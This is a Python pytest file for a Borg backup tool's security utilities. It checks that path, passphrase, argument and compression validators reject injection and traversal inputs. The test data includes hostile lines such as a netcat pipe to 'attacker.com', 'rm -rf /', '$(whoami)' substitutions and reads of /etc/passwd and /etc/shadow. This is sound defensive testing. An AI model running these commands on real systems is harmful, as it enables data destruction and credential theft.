"""
Tests for security utilities - CRITICAL for preventing command injection and path traversal
"""

import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch

from borgitory.utils.security import (
    sanitize_path,
    sanitize_passphrase,
    build_secure_borg_command,
    validate_archive_name,
    validate_compression,
    get_or_generate_secret_key,
)
from borgitory.utils.secure_path import (
    validate_secure_path,
    validate_mnt_path,
    _pre_validate_user_input,
)


class TestSanitizePath:
    """Test path sanitization to prevent directory traversal attacks."""

    def test_sanitize_valid_path(self) -> None:
        """Test sanitization of valid paths."""
        valid_paths = [
            "/home/user/backups",
            "/var/lib/borg",
            "C:\\Users\\test\\backups",
            "relative/path/to/backup",
            "/tmp/repo.borg",
        ]

        for path in valid_paths:
            result = sanitize_path(path)
            assert isinstance(result, str)
            assert len(result) > 0

    def test_sanitize_path_empty_string(self) -> None:
        """Test that empty strings raise ValueError."""
        with pytest.raises(ValueError, match="Path must be a non-empty string"):
            sanitize_path("")

    def test_sanitize_path_none(self) -> None:
        """Test that None raises ValueError."""
        with pytest.raises(ValueError, match="Path must be a non-empty string"):
            sanitize_path(None)

    def test_sanitize_path_non_string(self) -> None:
        """Test that non-strings raise ValueError."""
        with pytest.raises(ValueError, match="Path must be a non-empty string"):
            sanitize_path(123)

    def test_sanitize_path_directory_traversal(self) -> None:
        """Test that directory traversal patterns are blocked."""
        dangerous_paths = [
            "../etc/passwd",
            "../../etc/shadow",
            "/home/user/../../../etc/passwd",
            "..\\..\\windows\\system32",
            "backup/../../../secret",
            "path/to/../../../system",
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError, match="Path contains dangerous pattern"):
                sanitize_path(path)

    def test_sanitize_path_command_injection(self) -> None:
        """Test that command injection characters are blocked."""
        dangerous_paths = [
            "/path; rm -rf /",
            "/path && cat /etc/passwd",
            "/path | nc attacker.com 1234",
            "/path > /dev/null",
            "/path < /etc/passwd",
            "/path & background_cmd",
            "/path`whoami`",
            "/path$(whoami)",
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError, match="Path contains dangerous pattern"):
                sanitize_path(path)

    def test_sanitize_path_null_bytes(self) -> None:
        """Test that null bytes are removed."""
        path_with_nulls = "/path/to/file\x00extra"
        result = sanitize_path(path_with_nulls)
        assert "\x00" not in result

    def test_sanitize_path_newlines(self) -> None:
        """Test that newlines are blocked."""
        with pytest.raises(ValueError, match="Path contains dangerous pattern"):
            sanitize_path("/path\nto/file")

        with pytest.raises(ValueError, match="Path contains dangerous pattern"):
            sanitize_path("/path\rto/file")


class TestSanitizePassphrase:
    """Test passphrase sanitization to prevent injection attacks."""

    def test_sanitize_valid_passphrase(self) -> None:
        """Test valid passphrases."""
        valid_passphrases = [
            "simple123",
            "MySecurePassphrase123!@#",
            "P@ssw0rd_with_underscores",
            "unicode-characters",  # Removed non-ASCII for test stability
            "spaces are ok too",
            "1234567890",
            "!@#%^*()_+-=[]{}:,./?",  # Removed $ and & as they're blocked
        ]

        for passphrase in valid_passphrases:
            result = sanitize_passphrase(passphrase)
            assert result == passphrase

    def test_sanitize_passphrase_empty(self) -> None:
        """Test that empty passphrases raise ValueError."""
        with pytest.raises(ValueError, match="Passphrase must be a non-empty string"):
            sanitize_passphrase("")

    def test_sanitize_passphrase_none(self) -> None:
        """Test that None raises ValueError."""
        with pytest.raises(ValueError, match="Passphrase must be a non-empty string"):
            sanitize_passphrase(None)

    def test_sanitize_passphrase_non_string(self) -> None:
        """Test that non-strings raise ValueError."""
        with pytest.raises(ValueError, match="Passphrase must be a non-empty string"):
            sanitize_passphrase(123)

    def test_sanitize_passphrase_dangerous_chars(self) -> None:
        """Test that dangerous shell characters are blocked."""
        dangerous_passphrases = [
            "pass'word",  # Single quote
            'pass"word',  # Double quote
            "pass`word",  # Backtick
            "pass$word",  # Dollar sign
            "pass\\word",  # Backslash
            "pass\nword",  # Newline
            "pass\rword",  # Carriage return
            "pass;word",  # Semicolon
            "pass&word",  # Ampersand
            "pass|word",  # Pipe
            "pass<word",  # Less than
            "pass>word",  # Greater than
        ]

        for passphrase in dangerous_passphrases:
            with pytest.raises(
                ValueError, match="Passphrase contains dangerous character"
            ):
                sanitize_passphrase(passphrase)


class TestBuildSecureBorgCommand:
    """Test secure Borg command building to prevent injection attacks."""

    def test_build_basic_command(self) -> None:
        """Test building a basic Borg command."""
        command, env = build_secure_borg_command(
            "borg create", "/path/to/repo", "test_passphrase"
        )

        # Check command structure (path may be normalized on Windows)
        assert command[0] == "borg"
        assert command[1] == "create"
        assert len(command) == 3
        assert "repo" in command[2]  # Path should contain repo
        assert env["BORG_PASSPHRASE"] == "test_passphrase"
        assert "BORG_RELOCATED_REPO_ACCESS_IS_OK" in env

    def test_build_command_with_additional_args(self) -> None:
        """Test building command with additional arguments."""
        command, env = build_secure_borg_command(
            "borg create",
            "/path/to/repo",
            "test_passphrase",
            ["--stats", "--compression", "lz4", "::archive-name"],
        )

        # Check command structure (path may be normalized)
        assert command[0] == "borg"
        assert command[1] == "create"
        assert "--stats" in command
        assert "--compression" in command
        assert "lz4" in command
        assert "::archive-name" in command
        assert any("repo" in arg for arg in command)  # Repo path should be present

    def test_build_command_empty_repo_path(self) -> None:
        """Test building command with empty repository path."""
        command, env = build_secure_borg_command(
            "borg list", "", "test_passphrase", ["/path/to/repo"]
        )

        assert command == ["borg", "list", "/path/to/repo"]

    def test_build_command_with_env_overrides(self) -> None:
        """Test building command with environment overrides."""
        command, env = build_secure_borg_command(
            "borg create",
            "/path/to/repo",
            "test_passphrase",
            environment_overrides={"BORG_RSH": "ssh -i /key"},
        )

        assert env["BORG_RSH"] == "ssh -i /key"
        assert env["BORG_PASSPHRASE"] == "test_passphrase"

    def test_build_command_invalid_env_name(self) -> None:
        """Test that invalid environment variable names are rejected."""
        with pytest.raises(ValueError, match="Invalid environment variable name"):
            build_secure_borg_command(
                "borg create",
                "/path/to/repo",
                "test_passphrase",
                environment_overrides={"invalid-name": "value"},
            )

    def test_build_command_dangerous_args(self) -> None:
        """Test that dangerous arguments are rejected."""
        dangerous_args = [
            "; rm -rf /",
            "arg && malicious",
            "arg | cat /etc/passwd",
            "arg > /dev/null",
            "arg < /etc/passwd",
            "arg & background",
            "arg`whoami`",
            "arg\nmalicious",
        ]

        for arg in dangerous_args:
            with pytest.raises(
                ValueError, match="Argument contains dangerous characters"
            ):
                build_secure_borg_command(
                    "borg create", "/path/to/repo", "test_passphrase", [arg]
                )

    def test_build_command_pattern_args(self) -> None:
        """Test that pattern arguments allow regex but block shell injection."""
        # Valid pattern arguments (regex metacharacters allowed)
        valid_patterns = [
            ["--pattern", "+fm:*.py"],
            ["--pattern", "-sh:cache/*"],
            ["--pattern", "+re:.*\\.log$"],
        ]

        for pattern_args in valid_patterns:
            command, env = build_secure_borg_command(
                "borg create", "/path/to/repo", "test_passphrase", pattern_args
            )
            assert len(command) > 2  # Should not raise exception

    def test_build_command_dangerous_patterns(self) -> None:
        """Test that dangerous patterns in --pattern args are still blocked."""
        dangerous_patterns = [
            ["--pattern", "+fm:*.py; rm -rf /"],
            ["--pattern", "+fm:*.py && cat /etc/passwd"],
            ["--pattern", "+fm:$(whoami)"],
            ["--pattern", "+fm:${HOME}"],
        ]

        for pattern_args in dangerous_patterns:
            with pytest.raises(
                ValueError, match="Argument contains dangerous characters"
            ):
                build_secure_borg_command(
                    "borg create", "/path/to/repo", "test_passphrase", pattern_args
                )

    def test_build_command_invalid_passphrase(self) -> None:
        """Test that invalid passphrases are rejected."""
        with pytest.raises(ValueError, match="Passphrase contains dangerous character"):
            build_secure_borg_command("borg create", "/path/to/repo", "bad'passphrase")

    def test_build_command_invalid_repo_path(self) -> None:
        """Test that invalid repository paths are rejected."""
        with pytest.raises(ValueError, match="Path contains dangerous pattern"):
            build_secure_borg_command(
                "borg create", "/path/../../../etc/passwd", "test_passphrase"
            )


class TestValidateArchiveName:
    """Test archive name validation."""

    def test_validate_valid_names(self) -> None:
        """Test valid archive names."""
        valid_names = [
            "backup-2023-01-01",
            "daily.backup.001",
            "backup_full_20230101",
            "MyBackup123",
            "a",  # Single character
            "backup-" + "x" * 190,  # Long but valid
        ]

        for name in valid_names:
            result = validate_archive_name(name)
            assert result == name

    def test_validate_empty_name(self) -> None:
        """Test that empty names raise ValueError."""
        with pytest.raises(ValueError, match="Archive name must be a non-empty string"):
            validate_archive_name("")

    def test_validate_none_name(self) -> None:
        """Test that None raises ValueError."""
        with pytest.raises(ValueError, match="Archive name must be a non-empty string"):
            validate_archive_name(None)

    def test_validate_non_string_name(self) -> None:
        """Test that non-strings raise ValueError."""
        with pytest.raises(ValueError, match="Archive name must be a non-empty string"):
            validate_archive_name(123)

    def test_validate_various_characters_now_allowed(self) -> None:
        """Test that various characters are now allowed in archive names."""
        # These names were previously invalid but are now allowed since character validation was removed
        previously_invalid_names = [
            "backup space",  # Space
            "backup/slash",
            "backup\\backslash",
            "backup:colon",
            "backup*asterisk",
            "backup?question",
            "backup|pipe",
            "backup<less",
            "backup>greater",
            'backup"quote',
            "backup'apostrophe",
            "backup;semicolon",
            "backup&ampersand",
            "backup$dollar",
            "backup`backtick",
        ]

        # All of these should now pass validation (only basic checks remain)
        for name in previously_invalid_names:
            result = validate_archive_name(name)
            assert result == name

    def test_validate_newline_still_problematic(self) -> None:
        """Test that newlines in names might still cause issues (but validation allows them)."""
        # Newlines are now allowed by validation but may cause issues elsewhere
        name_with_newline = "backup\nnewline"
        result = validate_archive_name(name_with_newline)
        assert result == name_with_newline

    def test_validate_too_long(self) -> None:
        """Test that overly long names are rejected."""
        long_name = "a" * 201
        with pytest.raises(ValueError, match="Archive name too long"):
            validate_archive_name(long_name)


class TestValidateCompression:
    """Test compression algorithm validation."""

    def test_validate_valid_compressions(self) -> None:
        """Test valid compression algorithms."""
        valid_compressions = [
            "none",
            "lz4",
            "zlib",
            "lzma",
            "zstd",
            "lz4,1",
            "lz4,9",
            "zlib,1",
            "zlib,9",
            "lzma,0",
            "lzma,9",
            "zstd,1",
            "zstd,22",
        ]

        for compression in valid_compressions:
            result = validate_compression(compression)
            assert result == compression

    def test_validate_invalid_compression(self) -> None:
        """Test invalid compression algorithms."""
        invalid_compressions = [
            "bzip2",  # Not supported
            "invalid",
            "lz4,10",  # Invalid level
            "zstd,25",  # Invalid level
            "lzma,-1",  # Invalid level
            "none,1",  # None with level
            "",  # Empty
            "lz4;rm -rf /",  # Injection attempt
        ]

        for compression in invalid_compressions:
            with pytest.raises(ValueError, match="Invalid compression"):
                validate_compression(compression)


class TestGetOrGenerateSecretKey:
    """Test secret key generation and retrieval."""

    def test_generate_new_secret_key(self) -> None:
        """Test generating a new secret key."""
        with tempfile.TemporaryDirectory() as temp_dir:
            secret_key = get_or_generate_secret_key(temp_dir)

            # Should be a non-empty string
            assert isinstance(secret_key, str)
            assert len(secret_key) > 0

            # Should create the secret key file
            secret_file = Path(temp_dir) / "secret_key"
            assert secret_file.exists()
            assert secret_file.read_text().strip() == secret_key

    def test_retrieve_existing_secret_key(self) -> None:
        """Test retrieving an existing secret key."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # First call creates the key
            secret_key1 = get_or_generate_secret_key(temp_dir)

            # Second call should retrieve the same key
            secret_key2 = get_or_generate_secret_key(temp_dir)

            assert secret_key1 == secret_key2

    def test_secret_key_persistence(self) -> None:
        """Test that secret key persists across calls."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Generate key
            original_key = get_or_generate_secret_key(temp_dir)

            # Verify file content
            secret_file = Path(temp_dir) / "secret_key"
            file_content = secret_file.read_text().strip()
            assert file_content == original_key

            # Retrieve key again
            retrieved_key = get_or_generate_secret_key(temp_dir)
            assert retrieved_key == original_key

    @patch("pathlib.Path.mkdir")
    def test_directory_creation_failure(self, mock_mkdir) -> None:
        """Test handling of directory creation failure."""
        mock_mkdir.side_effect = OSError("Permission denied")

        with pytest.raises(Exception, match="Permission denied"):
            get_or_generate_secret_key("/nonexistent/path")

    @patch("pathlib.Path.read_text")
    def test_read_secret_key_failure(self, mock_read) -> None:
        """Test handling of secret key read failure."""
        mock_read.side_effect = OSError("Permission denied")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a dummy secret file
            secret_file = Path(temp_dir) / "secret_key"
            secret_file.write_text("dummy_key")

            with pytest.raises(Exception, match="Failed to read secret key"):
                get_or_generate_secret_key(temp_dir)

    @patch("pathlib.Path.write_text")
    def test_write_secret_key_failure(self, mock_write) -> None:
        """Test handling of secret key write failure."""
        mock_write.side_effect = OSError("Disk full")

        with tempfile.TemporaryDirectory() as temp_dir:
            with pytest.raises(Exception, match="Failed to save secret key"):
                get_or_generate_secret_key(temp_dir)

    def test_secret_key_format(self) -> None:
        """Test that generated secret keys are URL-safe."""
        with tempfile.TemporaryDirectory() as temp_dir:
            secret_key = get_or_generate_secret_key(temp_dir)

            # Should be URL-safe base64 (only alphanumeric, -, _)
            import re

            assert re.match(r"^[A-Za-z0-9_-]+$", secret_key)

            # Should be reasonably long for security
            assert len(secret_key) >= 32


class TestSecurityIntegration:
    """Integration tests for security functions working together."""

    def test_full_command_building_workflow(self) -> None:
        """Test the complete workflow of building a secure command."""
        # Simulate a real backup command workflow
        repository_path = "/home/user/backup-repo"
        passphrase = "MySecureBackupPassphrase123"
        archive_name = validate_archive_name("backup-2023-01-01")
        compression = validate_compression("lz4")

        # Build the complete command
        command, env = build_secure_borg_command(
            "borg create",
            repository_path,
            passphrase,
            [
                "--stats",
                "--compression",
                compression,
                f"::{archive_name}",
                "/home/user/data",
            ],
        )

        # Check command structure (paths may be normalized)
        assert command[0] == "borg"
        assert command[1] == "create"
        assert "--stats" in command
        assert "--compression" in command
        assert "lz4" in command
        assert "::backup-2023-01-01" in command
        assert "/home/user/data" in command
        assert any("backup-repo" in arg for arg in command)
        assert env["BORG_PASSPHRASE"] == passphrase

    def test_security_validation_chain(self) -> None:
        """Test that security validations work together to prevent attacks."""
        # This should fail at multiple levels
        with pytest.raises(ValueError):
            malicious_repo = "../../../etc/passwd"
            malicious_passphrase = "pass; rm -rf /"
            malicious_archive = "archive`whoami`"
            malicious_compression = "lz4; cat /etc/shadow"

            # Each of these should individually fail
            sanitize_path(malicious_repo)

        with pytest.raises(ValueError):
            sanitize_passphrase(malicious_passphrase)

        # Archive name validation no longer rejects special characters
        # This would now pass validation (but could still cause issues elsewhere)
        result = validate_archive_name(malicious_archive)
        assert result == malicious_archive

        with pytest.raises(ValueError):
            validate_compression(malicious_compression)

    def test_edge_case_combinations(self) -> None:
        """Test edge cases that might slip through individual validations."""
        # Test very long valid inputs
        long_valid_path = "/very/long/path/" + "subdir/" * 20 + "repo"
        long_valid_passphrase = "a" * 100  # Long but valid

        # These should work
        sanitized_path = sanitize_path(long_valid_path)
        sanitized_passphrase = sanitize_passphrase(long_valid_passphrase)

        assert len(sanitized_path) > 0
        assert sanitized_passphrase == long_valid_passphrase


class TestSecurePathValidation:
    """Test secure path validation utilities to prevent directory traversal and path injection."""

    def test_validate_secure_path_legitimate_paths(self) -> None:
        """Test that legitimate paths are properly allowed."""
        legitimate_paths = [
            ("/mnt", "Root mount directory"),
            ("/mnt/backup", "Backup directory"),
            ("/mnt/data/repos", "Nested repository path"),
            ("relative/path", "Relative path"),
            ("test.txt", "Simple filename"),
            ("/app/data/config", "App data path"),
            ("/app/data/keyfiles/key.key", "Keyfile path"),
        ]

        for test_path, description in legitimate_paths:
            result = validate_secure_path(test_path)
            assert result is not None, f"Failed to allow {description}: '{test_path}'"
            assert (
                str(result).replace("\\", "/").endswith(test_path.replace("\\", "/"))
            ), f"Path resolution changed for {description}"

    def test_validate_secure_path_security_attacks(self) -> None:
        """Test that security attack vectors are properly blocked."""
        attack_vectors = [
            ("../../etc/passwd", "Directory traversal with relative path"),
            ("/mnt/../etc/passwd", "Directory traversal with absolute path"),
            ("/mnt/test/../../../etc/passwd", "Complex directory traversal"),
            ("test/../../../etc/passwd", "Relative traversal"),
            ("test\x00/../../etc/passwd", "Null byte with traversal"),
            ("/etc/passwd\x00ignored", "Null byte termination attack"),
            ("", "Empty string"),
            ("   ", "Whitespace only"),
            ("/tmp/test", "Path outside allowed directories"),
            ("/var/test", "Another disallowed absolute path"),
            ("/home/user/.ssh/id_rsa", "SSH key path"),
            ("/etc/shadow", "Shadow password file"),
            ("/proc/version", "Proc filesystem"),
            ("/dev/null", "Device file"),
        ]

        for test_path, description in attack_vectors:
            result = validate_secure_path(test_path)
            assert result is None, f"Failed to block {description}: '{test_path}'"

    def test_validate_mnt_path_only_allows_mnt(self) -> None:
        """Test that validate_mnt_path only allows /mnt paths."""
        # Should allow /mnt paths
        mnt_paths = ["/mnt", "/mnt/backup", "/mnt/data/repos", "relative/path"]
        for path in mnt_paths:
            result = validate_mnt_path(path)
            assert result is not None, f"validate_mnt_path should allow: '{path}'"

        # Should reject /app/data paths
        app_data_paths = [
            "/app/data",
            "/app/data/config",
            "/app/data/keyfiles/key.key",
        ]
        for path in app_data_paths:
            result = validate_mnt_path(path)
            assert result is None, (
                f"validate_mnt_path should reject app data path: '{path}'"
            )

    def test_pre_validate_user_input_type_validation(self) -> None:
        """Test pre-validation input type checking."""
        allowed_prefixes = ["/mnt", "/app/data"]

        # Should reject non-strings
        assert _pre_validate_user_input(None, allowed_prefixes) is False
        assert _pre_validate_user_input(123, allowed_prefixes) is False
        assert _pre_validate_user_input(["path"], allowed_prefixes) is False

        # Should accept valid strings
        assert _pre_validate_user_input("/mnt/test", allowed_prefixes) is True
        assert _pre_validate_user_input("relative/path", allowed_prefixes) is True

    def test_pre_validate_user_input_empty_and_whitespace(self) -> None:
        """Test pre-validation empty and whitespace handling."""
        allowed_prefixes = ["/mnt"]

        # Should reject empty and whitespace-only strings
        assert _pre_validate_user_input("", allowed_prefixes) is False
        assert _pre_validate_user_input("   ", allowed_prefixes) is False
        assert _pre_validate_user_input("\t\n", allowed_prefixes) is False

        # Should accept valid non-empty strings
        assert _pre_validate_user_input("test", allowed_prefixes) is True
        assert _pre_validate_user_input("/mnt/test", allowed_prefixes) is True

    def test_pre_validate_user_input_null_bytes(self) -> None:
        """Test pre-validation null byte detection."""
        allowed_prefixes = ["/mnt"]

        # Should reject strings with null bytes
        assert _pre_validate_user_input("/mnt/test\x00", allowed_prefixes) is False
        assert _pre_validate_user_input("test\x00extra", allowed_prefixes) is False
        assert _pre_validate_user_input("\x00start", allowed_prefixes) is False

        # Should accept strings without null bytes
        assert _pre_validate_user_input("/mnt/test", allowed_prefixes) is True

    def test_pre_validate_user_input_absolute_path_restrictions(self) -> None:
        """Test pre-validation absolute path restrictions."""
        allowed_prefixes = ["/mnt", "/app/data"]

        # Should allow absolute paths under allowed prefixes
        assert _pre_validate_user_input("/mnt", allowed_prefixes) is True
        assert _pre_validate_user_input("/mnt/test", allowed_prefixes) is True
        assert _pre_validate_user_input("/app/data", allowed_prefixes) is True
        assert _pre_validate_user_input("/app/data/config", allowed_prefixes) is True

        # Should reject absolute paths outside allowed prefixes
        assert _pre_validate_user_input("/etc/passwd", allowed_prefixes) is False
        assert _pre_validate_user_input("/tmp/test", allowed_prefixes) is False
        assert _pre_validate_user_input("/var/log", allowed_prefixes) is False
        assert _pre_validate_user_input("/home/user", allowed_prefixes) is False

        # Should always allow relative paths (to be joined with allowed roots)
        assert _pre_validate_user_input("relative/path", allowed_prefixes) is True
        assert _pre_validate_user_input("test.txt", allowed_prefixes) is True

    def test_cross_platform_path_handling(self) -> None:
        """Test that path validation works across different platforms."""
        # Test paths that should work on both Windows and Unix
        cross_platform_paths = [
            "/mnt/backup",
            "/app/data/config",
            "relative/path",
            "test.txt",
        ]

        for path in cross_platform_paths:
            result = validate_secure_path(path)
            assert result is not None, f"Cross-platform path failed: '{path}'"

    def test_path_normalization_security(self) -> None:
        """Test that path normalization prevents traversal attacks."""
        # These paths attempt traversal but should be blocked
        traversal_attempts = [
            "/mnt/../etc/passwd",
            "/mnt/backup/../../../etc/passwd",
            "/mnt/./../../etc/passwd",
            "/app/data/../../../etc/passwd",
        ]

        for path in traversal_attempts:
            result = validate_secure_path(path)
            assert result is None, f"Failed to block traversal attempt: '{path}'"

    def test_symlink_security_handling(self) -> None:
        """Test that symlink resolution maintains security boundaries."""
        # Note: This test verifies the logic handles symlinks securely
        # In a real environment, symlinks could potentially escape containment
        # but our resolve() + relative_to() check should catch that

        # Test legitimate paths that might contain symlinks
        legitimate_paths = ["/mnt/data", "/app/data/keyfiles"]

        for path in legitimate_paths:
            result = validate_secure_path(path)
            # Should either succeed or fail safely (not raise exceptions)
            assert result is None or isinstance(result, Path)

    def test_validate_secure_path_with_allow_app_data_flag(self) -> None:
        """Test that the allow_app_data flag works correctly."""
        app_data_path = "/app/data/test"

        # Should allow app data path when flag is True (default)
        result_with_app_data = validate_secure_path(app_data_path, allow_app_data=True)
        assert result_with_app_data is not None

        # Should reject app data path when flag is False
        result_without_app_data = validate_secure_path(
            app_data_path, allow_app_data=False
        )
        assert result_without_app_data is None

        # /mnt paths should always work regardless of flag
        mnt_path = "/mnt/test"
        assert validate_secure_path(mnt_path, allow_app_data=True) is not None
        assert validate_secure_path(mnt_path, allow_app_data=False) is not None

    def test_edge_case_path_combinations(self) -> None:
        """Test edge cases and boundary conditions."""
        edge_cases = [
            # Unicode and international characters
            ("/mnt/测试", "Unicode characters"),
            ("/mnt/café", "Accented characters"),
            # Special but legitimate path components
            ("/mnt/backup.tar.gz", "Multiple dots in filename"),
            ("/mnt/backup-2023-12-01", "Hyphens in path"),
            ("/mnt/backup_20231201", "Underscores in path"),
            # Edge case relative paths
            (".", "Current directory"),
            ("./test", "Explicit current directory"),
        ]

        for test_path, description in edge_cases:
            # These should either work or fail gracefully (not crash)
            try:
                result = validate_secure_path(test_path)
                # If it succeeds, result should be a Path object
                if result is not None:
                    assert isinstance(result, Path), (
                        f"Invalid result type for {description}"
                    )
            except Exception as e:
                # If it fails, should be a controlled failure, not a crash
                assert isinstance(e, (ValueError, RuntimeError)), (
                    f"Unexpected exception for {description}: {e}"
                )

    def test_security_regression_prevention(self) -> None:
        """Test specific attack patterns that have been seen in the wild."""
        # These are real-world attack patterns that should be blocked
        path_traversal_attacks = [
            # Mixed separator attacks
            ("..\\../etc/passwd", "Mixed path separators"),
            ("..\\..\\etc\\passwd", "Windows-style traversal on Unix"),
            # Null byte truncation
            ("/mnt/allowed\x00/../../../etc/passwd", "Null byte truncation attack"),
            # Space and tab confusion
            ("/mnt/../ /etc/passwd", "Space confusion"),
            ("/mnt/../\t/etc/passwd", "Tab confusion"),
        ]

        for attack_pattern, description in path_traversal_attacks:
            result = validate_secure_path(attack_pattern)
            assert result is None, f"Failed to block {description}: '{attack_pattern}'"

        # URL encoded patterns are treated as literal filenames (correct behavior)
        # URL decoding should happen at the web framework layer, not path validation
        url_encoded_patterns = [
            (
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "URL encoded traversal as literal filename",
            ),
            (
                "..%c0%af..%c0%afetc%c0%afpasswd",
                "Unicode normalization as literal filename",
            ),
            (
                "..%c0%ae%c0%ae/etc/passwd",
                "Overlong UTF-8 sequence as literal filename",
            ),
        ]

        for pattern, description in url_encoded_patterns:
            result = validate_secure_path(pattern)
            # These should be treated as literal filenames under /mnt, which is safe
            if result is not None:
                # Verify they resolve to safe paths under /mnt
                assert "/mnt" in str(result).replace("\\", "/"), (
                    f"URL encoded pattern not safely contained: '{pattern}'"
                )
